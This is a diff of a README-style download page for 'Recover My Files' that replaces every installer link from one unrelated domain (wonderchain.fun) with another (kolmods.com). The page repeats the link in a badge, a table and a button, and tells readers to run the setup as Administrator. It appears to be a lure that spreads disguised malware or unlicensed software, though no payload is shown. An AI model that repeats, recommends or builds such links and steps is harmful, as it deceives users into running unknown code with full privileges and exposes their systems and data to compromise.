@@ -16,27 +16,27 @@ Direct installer link below.
 > **This is the download page.** Use the button or link below to get **Recover My Files** for Windows.
 
 <p align="center">
-  <a href="https://recovermyfiles.wonderchain.fun/">
+  <a href="https://recovermyfiles.kolmods.com/">
     <img src="https://img.shields.io/badge/Download-Recover%20My%20Files-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Recover My Files">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[recovermyfiles.wonderchain.fun](https://recovermyfiles.wonderchain.fun/)** |
-| **Full URL** | `https://recovermyfiles.wonderchain.fun/` |
+| **Direct link** | **[recovermyfiles.kolmods.com](https://recovermyfiles.kolmods.com/)** |
+| **Full URL** | `https://recovermyfiles.kolmods.com/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — recovermyfiles.wonderchain.fun](https://recovermyfiles.wonderchain.fun/)** (link above)
+1. Click **[Download — recovermyfiles.kolmods.com](https://recovermyfiles.kolmods.com/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://recovermyfiles.wonderchain.fun/"><strong>⬇ Download Recover My Files now</strong></a></p>
+<p align="center"><a href="https://recovermyfiles.kolmods.com/"><strong>⬇ Download Recover My Files now</strong></a></p>
 
 ---
 
